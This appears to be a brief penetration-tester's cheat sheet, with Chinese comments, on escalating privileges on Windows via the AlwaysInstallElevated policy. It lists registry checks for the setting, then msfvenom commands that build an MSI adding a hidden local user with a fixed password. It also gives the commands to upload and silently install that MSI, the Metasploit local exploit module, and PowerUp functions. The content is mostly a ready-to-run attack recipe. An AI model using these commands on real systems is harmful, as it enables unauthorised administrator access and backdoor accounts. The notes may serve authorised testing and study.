	>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

	PS > Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
	PS > Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
	为1 检测是否永远以高权限启动安装
	#HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
	新建DWORD32 DisableMSI=0
	>msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi
	>msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi-nouac -o /root/add.msi
	>upload /root/add.msi c:\\1.msi
	>msiexec /quiet /qn /i c:\1.msi
	MSF
	>use exploit/windows/local/always_install_elevated
	>set session 1
	PowerUp
	Get-RegistryAlwaysInstallElevated,Write-UserAddMSI